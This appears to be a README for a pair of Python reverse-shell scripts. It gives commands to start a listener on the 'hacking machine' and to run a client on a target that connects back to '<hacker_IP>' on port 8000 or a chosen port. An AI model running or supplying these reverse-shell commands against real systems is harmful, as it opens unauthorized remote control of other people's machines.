# Usage

## On Hacking machine
python3 reverseShellServer.py

## On Client machine
python3 reverseShellClient.py <hacker_IP>


### Port as an optional argument
Both scripts communicate on port 8000 by default.
This can be changed to another port - but you would need to make sure both scripts have the same port..

#### On Hacking machine
python3 reverseShellServer.py <port>

#### On Client machine
python3 reverseShellClient.py <hacker_IP> <port>